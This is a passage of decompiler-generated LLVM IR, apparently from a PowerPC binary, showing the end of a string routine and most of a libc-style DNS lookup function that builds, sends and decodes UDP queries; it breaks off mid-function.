  %v2_100256a4 = add i32 %v0_100256a4, %v2_10025698
  %v3_100256a4 = inttoptr i32 %v2_100256a4 to i8*
  %v4_100256a4 = load i8, i8* %v3_100256a4, align 1
  %v3_100256a8 = icmp eq i8 %v4_100256a4, 0
  br i1 %v3_100256a8, label %dec_label_pc_100256b4, label %dec_label_pc_100256b0

dec_label_pc_100256b0:                            ; preds = %dec_label_pc_100256a4
  br label %dec_label_pc_100256b4

dec_label_pc_100256b4:                            ; preds = %dec_label_pc_100256a4, %dec_label_pc_100256b0
  %v0_100256b4.off0 = phi i8 [ 0, %dec_label_pc_100256a4 ], [ 46, %dec_label_pc_100256b0 ]
  %v1_100256b4 = load i32, i32* @r25, align 4
  %v2_100256b4 = load i32, i32* @r29, align 4
  %v4_100256b4 = add i32 %v2_100256b4, %v1_100256b4
  %v5_100256b4 = inttoptr i32 %v4_100256b4 to i8*
  store i8 %v0_100256b4.off0, i8* %v5_100256b4, align 1
  %v0_100256b8.pre = load i32, i32* @r28, align 4
  %v0_100256c0.pre.pre = load i32, i32* @r23, align 4
  %v1_100256bc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_100256b8

dec_label_pc_100256b8:                            ; preds = %dec_label_pc_10025660, %dec_label_pc_100256b4
  %v1_100256bc = phi i32 [ %v2_10025670, %dec_label_pc_10025660 ], [ %v1_100256bc.pre, %dec_label_pc_100256b4 ]
  %v0_100256c0.pre = phi i32 [ 0, %dec_label_pc_10025660 ], [ %v0_100256c0.pre.pre, %dec_label_pc_100256b4 ]
  %v0_100256b8 = phi i32 [ %v0_10025668, %dec_label_pc_10025660 ], [ %v0_100256b8.pre, %dec_label_pc_100256b4 ]
  %v0_100256bc.pre = load i32, i32* @r26, align 4
  store i32 %v0_100256b8, i32* %r11.global-to-local, align 4
  %v2_100256bc = add i32 %v1_100256bc, %v0_100256bc.pre
  %v3_100256bc = inttoptr i32 %v2_100256bc to i8*
  %v4_100256bc = load i8, i8* %v3_100256bc, align 1
  %v5_100256bc = zext i8 %v4_100256bc to i32
  store i32 %v5_100256bc, i32* @r31, align 4
  %v3_100256c0 = icmp eq i32 %v0_100256c0.pre, 0
  store i1 %v3_100256c0, i1* %cr4_eq.global-to-local, align 1
  %v3_100256c4 = icmp eq i8 %v4_100256bc, 0
  br i1 %v3_100256c4, label %dec_label_pc_100256cc, label %dec_label_pc_10025640

dec_label_pc_100256cc:                            ; preds = %dec_label_pc_100256b8
  %v0_100256d4.pre.pre = load i32, i32* @r27, align 4
  br i1 %v3_100256c0, label %dec_label_pc_100256e0, label %dec_label_pc_100256d0

dec_label_pc_100256d0:                            ; preds = %dec_label_pc_10025630, %dec_label_pc_100256cc
  %v0_100256d4.pre26 = phi i32 [ %v0_100256d4.pre.pre, %dec_label_pc_100256cc ], [ 0, %dec_label_pc_10025630 ]
  %v1_100256d0 = add i32 %v0_100256d4.pre26, 1
  store i32 %v1_100256d0, i32* @r27, align 4
  br label %dec_label_pc_100256e0

dec_label_pc_100256e0:                            ; preds = %dec_label_pc_10025678, %dec_label_pc_100256cc, %dec_label_pc_100256d0, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_100256d0, %dec_label_pc_100256d0 ], [ %v0_100256d4.pre.pre, %dec_label_pc_100256cc ], [ -1, %dec_label_pc_10025678 ]
  %v1_100256f0 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1002560c)
  %v9_100256f0 = extractvalue %0 %v1_100256f0, 7
  store i4 %v9_100256f0, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_100256d4.pre.pre, { 1, 0 }
  uselistorder i1 %v3_100256c0, { 0, 2, 1 }
  uselistorder i32 %v5_100256bc, { 1, 0 }
  uselistorder i32 %v5_100256bc21, { 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %v0_1002560c, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i8 46, { 0, 3, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 23, { 30, 25, 19, 27, 20, 21, 22, 23, 24, 34, 35, 31, 32, 33, 0, 18, 1, 2, 26, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 28, 29 }
  uselistorder i32 18, { 8, 0, 9, 10, 11, 12, 1, 2, 13, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_100256e0, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100256d0, { 1, 0 }
  uselistorder label %dec_label_pc_100256b8, { 1, 0 }
  uselistorder label %dec_label_pc_100256b4, { 1, 0 }
  uselistorder label %dec_label_pc_100256a4, { 1, 0 }
  uselistorder label %dec_label_pc_10025660, { 1, 0 }
  uselistorder label %dec_label_pc_10025648, { 1, 0 }
  uselistorder label %dec_label_pc_10025640, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_10025700 = load i32, i32* @lr, align 4
  store i32 %v0_10025700, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* @r16, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268588844, i32* @lr, align 4
  %v0_10025728 = call i32 @malloc()
  store i32 %v0_10025728, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268588856, i32* @lr, align 4
  %v0_10025734 = call i32 @malloc()
  %v0_10025738 = load i32, i32* @r30, align 4
  %v3_10025738 = icmp eq i32 %v0_10025738, 0
  store i32 %v0_10025734, i32* @r21, align 4
  br i1 %v3_10025738, label %dec_label_pc_10025cf4, label %dec_label_pc_10025744

dec_label_pc_10025744:                            ; preds = %entry
  %v3_10025744 = icmp eq i32 %v0_10025734, 0
  br i1 %v3_10025744, label %dec_label_pc_10025cf4, label %dec_label_pc_1002574c

dec_label_pc_1002574c:                            ; preds = %dec_label_pc_10025744
  %v0_1002574c = load i32, i32* @r23, align 4
  %v3_1002574c = icmp eq i32 %v0_1002574c, 0
  br i1 %v3_1002574c, label %dec_label_pc_10025cf4, label %dec_label_pc_10025754

dec_label_pc_10025754:                            ; preds = %dec_label_pc_1002574c
  %v0_10025754 = load i32, i32* %r14.global-to-local, align 4
  %v1_10025754 = inttoptr i32 %v0_10025754 to i8*
  %v2_10025754 = load i8, i8* %v1_10025754, align 1
  %v3_10025754 = zext i8 %v2_10025754 to i32
  store i32 %v3_10025754, i32* %r0.global-to-local, align 4
  %v3_10025758 = icmp eq i8 %v2_10025754, 0
  br i1 %v3_10025758, label %dec_label_pc_10025cf4, label %dec_label_pc_10025760

dec_label_pc_10025760:                            ; preds = %dec_label_pc_10025754
  store i32 %v0_10025754, i32* @r3, align 4
  store i32 268763136, i32* %r29.global-to-local, align 4
  %v0_10025768 = call i32 @__GI_strlen()
  %v0_10025770 = load i32, i32* %r14.global-to-local, align 4
  %v2_10025770 = add i32 %v0_10025770, %v0_10025768
  %v1_10025778 = add i32 %v2_10025770, -1
  %v2_10025778 = inttoptr i32 %v1_10025778 to i8*
  %v3_10025778 = load i8, i8* %v2_10025778, align 1
  %v4_10025778 = zext i8 %v3_10025778 to i32
  store i32 %v4_10025778, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1004db58.1359 to i32), i32* @r29, align 4
  %v2_10025780 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10025780, i32* @r28, align 4
  %v4_10025790 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268527848, i32 ptrtoint (i32* @global_var_1004db58.1359 to i32))
  %v0_10025794 = load i32, i32* @r29, align 4
  store i32 268588956, i32* @lr, align 4
  %v1_10025798 = call i32 @pthread_mutex_lock(i32 %v0_10025794)
  %v3_100257a0 = load i32, i32* @global_var_10045288.1360, align 4
  store i32 %v3_100257a0, i32* %r11.global-to-local, align 4
  %v3_100257ac = load i16, i16* @global_var_10045084.1361, align 2
  %v4_100257ac = zext i16 %v3_100257ac to i32
  store i32 %v4_100257ac, i32* @r25, align 4
  %v1_100257b0 = load i32, i32* @r23, align 4
  store i32 %v2_10025780, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 0, i32* @r17, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* @r18, align 4
  store i32 -1, i32* @r22, align 4
  %v2_100257b0 = srem i32 %v3_100257a0, %v1_100257b0
  %v2_100257cc = sub i32 %v3_100257a0, %v2_100257b0
  store i32 %v2_100257cc, i32* %r0.global-to-local, align 4
  store i32 %v2_100257b0, i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_100257d8.1362 to i32), i32* @lr, align 4
  %v0_100257d4 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10025ce8.pr19 = load i32, i32* @r18, align 4
  %tmp57 = icmp ult i32 %v0_10025ce8.pr19, 3
  br i1 %tmp57, label %dec_label_pc_100257dc.lr.ph.lr.ph, label %dec_label_pc_10025d00

dec_label_pc_100257dc.lr.ph.lr.ph:                ; preds = %dec_label_pc_10025760
  %v2_100257f4 = ptrtoint i32* %stack_var_-144 to i32
  %v2_10025908 = ptrtoint i32* %stack_var_-204 to i32
  %v2_10025968 = ptrtoint i16* %stack_var_-212 to i32
  %v2_100259ac = ptrtoint i32* %stack_var_-248 to i32
  %v3_10025a08 = icmp eq i32 %tmp37, 0
  %v3_10025a14 = icmp eq i32 %tmp36, 3
  %v2_10025a90 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_10025ae4 = ptrtoint i32* %stack_var_-184 to i32
  %v3_10025b10 = icmp eq i32 %tmp33, 0
  %v3_10025a84 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_100257dc.lr.ph

dec_label_pc_100257dc:                            ; preds = %dec_label_pc_100257dc.lr.ph, %dec_label_pc_1002598c
  %v0_100257dc = load i32, i32* @r19, align 4
  %v3_100257dc = icmp eq i32 %v0_100257dc, -1
  br i1 %v3_100257dc, label %dec_label_pc_100257ec, label %dec_label_pc_100257e4

dec_label_pc_100257e4:                            ; preds = %dec_label_pc_100257dc
  store i32 268589036, i32* @lr, align 4
  %v1_100257e8 = call i32 @__libc_close(i32 %v0_100257dc)
  br label %dec_label_pc_100257ec

dec_label_pc_100257ec:                            ; preds = %dec_label_pc_100257dc, %dec_label_pc_100257e4
  store i32 0, i32* @r4, align 4
  store i32 512, i32* @r5, align 4
  store i32 %v2_100257f4, i32* @r29, align 4
  %v0_100257f8 = load i32, i32* @r30, align 4
  store i32 %v0_100257f8, i32* @r3, align 4
  store i32 268589056, i32* @lr, align 4
  %v0_100257fc = call i32 @__GI_memset()
  store i32 0, i32* @r4, align 4
  store i32 48, i32* @r5, align 4
  store i32 %v2_100257f4, i32* @r3, align 4
  store i32 268589072, i32* @lr, align 4
  %v0_1002580c = call i32 @__GI_memset()
  %v0_10025810 = load i32, i32* @r25, align 4
  %v1_10025810 = add i32 %v0_10025810, 1
  %v1_10025814 = urem i32 %v1_10025810, 65536
  store i32 %v1_10025814, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10025820 = load i32, i32* @r30, align 4
  store i32 %v1_10025814, i32* %stack_var_-144, align 4
  %v4_10025834 = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_10025820, i32 512)
  store i32 %v4_10025834, i32* @r28, align 4
  %v1_10025838 = icmp slt i32 %v4_10025834, 0
  br i1 %v1_10025838, label %dec_label_pc_10025d00, label %dec_label_pc_10025840

dec_label_pc_10025840:                            ; preds = %dec_label_pc_100257ec
  %v0_10025840 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10025840, i32* @r4, align 4
  %v0_10025848 = load i32, i32* @r21, align 4
  store i32 268697600, i32* %r29.global-to-local, align 4
  store i32 268589140, i32* @lr, align 4
  %v4_10025850 = call i32 @strncpy(i32 %v0_10025848, i32 %v0_10025840, i32 1025)
  store i32 ptrtoint (i32* @global_var_10045088.1212 to i32), i32* %r29.global-to-local, align 4
  %v4_10025868 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268527848, i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  store i32 268589172, i32* @lr, align 4
  %v1_10025870 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  %v0_10025874 = load i32, i32* @r22, align 4
  %v1_10025874 = icmp slt i32 %v0_10025874, 0
  %v0_1002587c = load i32, i32* @r26, align 4
  %v1_1002587c = mul i32 %v0_1002587c, 4
  store i32 %v1_1002587c, i32* %r0.global-to-local, align 4
  %v2_10025880 = add i32 %v1_1002587c, %arg4
  %v3_10025880 = inttoptr i32 %v2_10025880 to i32*
  %v4_10025880 = load i32, i32* %v3_10025880, align 4
  store i32 %v4_10025880, i32* %r29.global-to-local, align 4
  br i1 %v1_10025874, label %dec_label_pc_100258c8, label %dec_label_pc_10025888

dec_label_pc_10025888:                            ; preds = %dec_label_pc_10025840
  %v3_1002588c = load i32, i32* @global_var_10045290.1363, align 4
  store i32 %v3_1002588c, i32* %r0.global-to-local, align 4
  %v2_10025890 = icmp slt i32 %v0_10025874, %v3_1002588c
  br i1 %v2_10025890, label %dec_label_pc_10025898, label %dec_label_pc_100258c8

dec_label_pc_10025898:                            ; preds = %dec_label_pc_10025888
  store i32 ptrtoint (i32* @global_var_1002fb38.1364 to i32), i32* @r4, align 4
  %v0_100258a4 = load i32, i32* @r21, align 4
  store i32 268589228, i32* @lr, align 4
  %v4_100258a8 = inttoptr i32 %v0_100258a4 to i8*
  %v5_100258a8 = call i32 @__GI_strncat(i8* %v4_100258a8, i32 ptrtoint (i32* @global_var_1002fb38.1364 to i32), i32 1025, i32 268697600)
  %v0_100258b0 = load i32, i32* @r22, align 4
  %v1_100258b0 = mul i32 %v0_100258b0, 4
  store i32 %v1_100258b0, i32* %r0.global-to-local, align 4
  %v2_100258b8 = add i32 %v1_100258b0, ptrtoint (i32* @global_var_1004eef4.1365 to i32)
  %v3_100258b8 = inttoptr i32 %v2_100258b8 to i32*
  %v4_100258b8 = load i32, i32* %v3_100258b8, align 4
  store i32 %v4_100258b8, i32* @r4, align 4
  %v0_100258bc = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100258c8.1366 to i32), i32* @lr, align 4
  %v4_100258c4 = inttoptr i32 %v0_100258bc to i8*
  %v5_100258c4 = call i32 @__GI_strncat(i8* %v4_100258c4, i32 %v4_100258b8, i32 1025, i32 ptrtoint (i32* @global_var_1004eef4.1365 to i32))
  br label %dec_label_pc_100258c8

dec_label_pc_100258c8:                            ; preds = %dec_label_pc_10025888, %dec_label_pc_10025840, %dec_label_pc_10025898
  store i32 %v2_10025780, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_100258d4.1367 to i32), i32* @lr, align 4
  %v0_100258d0 = call i32 @__pthread_cleanup_pop_restore()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100258dc = load i32, i32* @r30, align 4
  %v1_100258dc = load i32, i32* @r28, align 4
  %v2_100258dc = add i32 %v1_100258dc, %v0_100258dc
  %v1_100258e0 = sub i32 512, %v1_100258dc
  %v0_100258e8 = load i32, i32* @r21, align 4
  store i32 %v0_100258e8, i32* %stack_var_-240, align 4
  store i32 268589300, i32* @lr, align 4
  %v4_100258f0 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_100258dc, i32 %v1_100258e0)
  store i32 %v4_100258f0, i32* @r27, align 4
  %v1_100258f4 = icmp slt i32 %v4_100258f0, 0
  br i1 %v1_100258f4, label %dec_label_pc_10025d00, label %dec_label_pc_100258fc

dec_label_pc_100258fc:                            ; preds = %dec_label_pc_100258c8
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10025904 = load i32, i32* @r29, align 4
  store i32 %v0_10025904, i32* @r4, align 4
  store i32 %v2_10025908, i32* @r5, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268589332, i32* @lr, align 4
  %v3_10025910 = call i32 @inet_pton(i32 10)
  %tmp59 = icmp slt i32 %v3_10025910, 1
  br i1 %tmp59, label %dec_label_pc_10025924thread-pre-split, label %dec_label_pc_1002591c

dec_label_pc_1002591c:                            ; preds = %dec_label_pc_100258fc
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10025924

dec_label_pc_10025924thread-pre-split:            ; preds = %dec_label_pc_100258fc
  %v3_10025924.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10025924

dec_label_pc_10025924:                            ; preds = %dec_label_pc_10025924thread-pre-split, %dec_label_pc_1002591c
  %v3_10025924 = phi i16 [ %v3_10025924.pr, %dec_label_pc_10025924thread-pre-split ], [ 10, %dec_label_pc_1002591c ]
  %v3_10025928 = icmp eq i16 %v3_10025924, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10025928, label %dec_label_pc_10025950, label %dec_label_pc_1002593c

dec_label_pc_1002593c:                            ; preds = %dec_label_pc_10025924
  %v0_10025940 = load i32, i32* @r29, align 4
  store i32 268589388, i32* @lr, align 4
  %v1_10025948 = call i32 @inet_addr(i32 %v0_10025940)
  %v3_10025950.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10025950

dec_label_pc_10025950:                            ; preds = %dec_label_pc_10025924, %dec_label_pc_1002593c
  %v3_10025950 = phi i16 [ 10, %dec_label_pc_10025924 ], [ %v3_10025950.pre, %dec_label_pc_1002593c ]
  %v4_10025950 = sext i16 %v3_10025950 to i32
  store i32 268589408, i32* @lr, align 4
  %v3_1002595c = call i32 @socket(i32 %v4_10025950, i32 2, i32 17)
  store i32 %v3_1002595c, i32* @r19, align 4
  %v1_10025960 = icmp slt i32 %v3_1002595c, 0
  br i1 %v1_10025960, label %dec_label_pc_1002598c, label %dec_label_pc_10025968

dec_label_pc_10025968:                            ; preds = %dec_label_pc_10025950
  store i32 268589428, i32* @lr, align 4
  %v3_10025970 = call i32 @__libc_connect(i32 %v2_10025968, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_10025970, -1
  br i1 %tmp60, label %dec_label_pc_10025994, label %dec_label_pc_1002597c

dec_label_pc_1002597c:                            ; preds = %dec_label_pc_10025968
  %v0_1002597c = call i32 @__errno_location()
  %v1_10025980 = inttoptr i32 %v0_1002597c to i32*
  %v2_10025980 = load i32, i32* %v1_10025980, align 4
  store i32 %v2_10025980, i32* %r0.global-to-local, align 4
  %v3_10025984 = icmp eq i32 %v2_10025980, 101
  br i1 %v3_10025984, label %dec_label_pc_10025ccc, label %dec_label_pc_1002598c

dec_label_pc_1002598c:                            ; preds = %dec_label_pc_1002597c, %dec_label_pc_10025950
  %v0_1002598c = load i32, i32* @r18, align 4
  %v1_1002598c = add i32 %v0_1002598c, 1
  store i32 %v1_1002598c, i32* @r18, align 4
  %tmp61 = icmp ult i32 %v1_1002598c, 3
  br i1 %tmp61, label %dec_label_pc_100257dc, label %dec_label_pc_10025d00

dec_label_pc_10025994:                            ; preds = %dec_label_pc_10025968
  %v0_10025994 = load i32, i32* @r28, align 4
  %v1_10025994 = load i32, i32* @r27, align 4
  %v2_10025994 = add i32 %v1_10025994, %v0_10025994
  %v0_10025998 = load i32, i32* @r30, align 4
  %v0_100259a0 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_100259a8.1368 to i32), i32* @lr, align 4
  %v4_100259a4 = call i32 @__libc_send(i32 %v0_100259a0, i32 %v0_10025998, i32 %v2_10025994, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100259bc = load i32, i32* @r19, align 4
  store i32 %v0_100259bc, i32* %stack_var_-248, align 4
  store i32 268589508, i32* @lr, align 4
  %v3_100259c0 = call i32 @__libc_poll(i32 %v2_100259ac, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_100259c0, 1
  br i1 %tmp62, label %dec_label_pc_10025ccc, label %dec_label_pc_100259cc

dec_label_pc_100259cc:                            ; preds = %dec_label_pc_10025994
  %v0_100259cc = load i32, i32* @r19, align 4
  %v0_100259d0 = load i32, i32* @r30, align 4
  store i32 268589536, i32* @lr, align 4
  %v4_100259dc = call i32 @__libc_recv(i32 %v0_100259cc, i32 %v0_100259d0, i32 512, i32 0)
  store i32 %v4_100259dc, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_100259dc, 12
  br i1 %tmp63, label %dec_label_pc_10025c74, label %dec_label_pc_100259ec

dec_label_pc_100259ec:                            ; preds = %dec_label_pc_100259cc
  %v0_100259ec = load i32, i32* @r30, align 4
  %v2_100259f4 = inttoptr i32 %v0_100259ec to i8*
  %v3_100259f4 = call i32 @__decode_header(i8* %v2_100259f4, i32 %v2_100257f4)
  %v3_100259f8 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_100259f8, i32* @r20, align 4
  %v1_100259fc = load i32, i32* @r25, align 4
  %v4_100259fc = icmp eq i32 %v3_100259f8, %v1_100259fc
  br i1 %v4_100259fc, label %dec_label_pc_10025a04, label %dec_label_pc_10025c74

dec_label_pc_10025a04:                            ; preds = %dec_label_pc_100259ec
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10025a08, label %dec_label_pc_10025c74, label %dec_label_pc_10025a10

dec_label_pc_10025a10:                            ; preds = %dec_label_pc_10025a04
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_10025a14, label %dec_label_pc_10025a1c, label %dec_label_pc_10025a84

dec_label_pc_10025a1c:                            ; preds = %dec_label_pc_10025a10
  %v0_10025a1c = load i32, i32* @r17, align 4
  %v3_10025a1c = icmp eq i32 %v0_10025a1c, 0
  br i1 %v3_10025a1c, label %dec_label_pc_10025a24, label %dec_label_pc_10025a78

dec_label_pc_10025a24:                            ; preds = %dec_label_pc_10025a1c
  store i32 ptrtoint (i32* @global_var_10045088.1212 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10025780, i32* @r28, align 4
  %v4_10025a40 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268527848, i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  store i32 268589644, i32* @lr, align 4
  %v1_10025a48 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  %v3_10025a50 = load i32, i32* @global_var_10045290.1363, align 4
  store i32 %v2_10025780, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_10025a5c = add i32 %v3_10025a50, -1
  store i32 %v1_10025a5c, i32* @r29, align 4
  store i32 268589668, i32* @lr, align 4
  %v0_10025a60 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10025a64 = load i32, i32* @r22, align 4
  %v1_10025a64 = load i32, i32* @r29, align 4
  %v2_10025a64 = icmp slt i32 %v0_10025a64, %v1_10025a64
  br i1 %v2_10025a64, label %dec_label_pc_10025a6c, label %dec_label_pc_10025a78

dec_label_pc_10025a6c:                            ; preds = %dec_label_pc_10025a24
  %v1_10025a6c = add i32 %v0_10025a64, 1
  store i32 %v1_10025a6c, i32* @r22, align 4
  %v0_10025a70 = load i32, i32* @r20, align 4
  store i32 %v0_10025a70, i32* @r25, align 4
  br label %dec_label_pc_10025ce8thread-pre-split.backedge

dec_label_pc_10025a78:                            ; preds = %dec_label_pc_10025a24, %dec_label_pc_10025a1c
  %v0_10025a78 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10025aac

dec_label_pc_10025a84:                            ; preds = %dec_label_pc_10025a10
  br i1 %v3_10025a84, label %dec_label_pc_10025a8c, label %dec_label_pc_10025c74

dec_label_pc_10025a8c:                            ; preds = %dec_label_pc_10025a84
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_10025aa4, label %dec_label_pc_10025a98

dec_label_pc_10025a98:                            ; preds = %dec_label_pc_10025a8c
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_10025ac410 = load i32, i32* @r30, align 4
  store i32 %v0_10025ac410, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10025ab4

dec_label_pc_10025aa4:                            ; preds = %dec_label_pc_10025a8c
  %v0_10025aa4 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10025aac

dec_label_pc_10025aac:                            ; preds = %dec_label_pc_10025a78, %dec_label_pc_10025aa4
  %storemerge3 = phi i32 [ %v0_10025aa4, %dec_label_pc_10025aa4 ], [ %v0_10025a78, %dec_label_pc_10025a78 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_10025aa4 ], [ 1, %dec_label_pc_10025a78 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10025aac = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10025aac, align 4
  br label %dec_label_pc_10025d10

dec_label_pc_10025ab4:                            ; preds = %dec_label_pc_10025a98, %dec_label_pc_10025ab4
  %v0_10025ac414 = phi i32 [ %v0_10025ac410, %dec_label_pc_10025a98 ], [ %v0_10025ac4, %dec_label_pc_10025ab4 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_10025a98 ], [ %v2_10025ab8, %dec_label_pc_10025ab4 ]
  store i32 268589752, i32* @lr, align 4
  %v2_10025ab4 = call i32 @__length_question(i32 %v0_10025ac414, i32 %storemerge213)
  %v0_10025ab8 = load i32, i32* %r28.global-to-local, align 4
  %v2_10025ab8 = add i32 %v0_10025ab8, %v2_10025ab4
  %v0_10025ac8.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10025ab8, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10025ab8, i32* @r4, align 4
  %v0_10025ac4 = load i32, i32* @r30, align 4
  store i32 %v0_10025ac4, i32* @r3, align 4
  %v2_10025ac8 = icmp slt i32 %v0_10025ac8.pr, 1
  %v1_10025acc = add i32 %v0_10025ac8.pr, 1
  store i32 %v1_10025acc, i32* %r29.global-to-local, align 4
  br i1 %v2_10025ac8, label %dec_label_pc_10025ab4, label %dec_label_pc_10025ad4

dec_label_pc_10025ad4:                            ; preds = %dec_label_pc_10025ab4
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_10025a90, label %dec_label_pc_10025c20, label %dec_label_pc_10025c28

dec_label_pc_10025ae4:                            ; preds = %dec_label_pc_10025c20
  store i32 %v2_10025ae4, i32* %r29.global-to-local, align 4
  %v0_10025ae8 = load i32, i32* @r30, align 4
  store i32 268589820, i32* @lr, align 4
  %v5_10025af8 = call i32 @__decode_answer(i32 %v0_10025ae8, i32 %v0_10025aec, i32 %v1_10025c20, i32* nonnull %stack_var_-184)
  store i32 %v5_10025af8, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_10025af8, -1
  br i1 %tmp64, label %dec_label_pc_10025b1c, label %dec_label_pc_10025b04

dec_label_pc_10025b04:                            ; preds = %dec_label_pc_10025ae4
  %v0_10025b04 = load i32, i32* @r24, align 4
  %v3_10025b04 = icmp eq i32 %v0_10025b04, 0
  br i1 %v3_10025b04, label %dec_label_pc_10025c74, label %dec_label_pc_10025b0c

dec_label_pc_10025b0c:                            ; preds = %dec_label_pc_10025b04
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10025b10, label %dec_label_pc_10025c74, label %dec_label_pc_10025c28

dec_label_pc_10025b1c:                            ; preds = %dec_label_pc_10025ae4
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10025b20 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10025b20, label %dec_label_pc_10025bc4, label %dec_label_pc_10025b28

dec_label_pc_10025b28:                            ; preds = %dec_label_pc_10025b1c
  %v0_10025b28 = load i32, i32* @r31, align 4
  store i32 %v2_10025ae4, i32* @r4, align 4
  %v1_10025b30 = add i32 %v0_10025b28, 28
  %v2_10025b30 = inttoptr i32 %v1_10025b30 to i32*
  %v3_10025b30 = load i32, i32* %v2_10025b30, align 4
  store i32 %v3_10025b30, i32* %r0.global-to-local, align 4
  store i32 %v0_10025b28, i32* @r3, align 4
  %v1_10025b38 = add i32 %v0_10025b28, 36
  %v2_10025b38 = inttoptr i32 %v1_10025b38 to i32*
  %v3_10025b38 = load i32, i32* %v2_10025b38, align 4
  store i32 %v3_10025b38, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
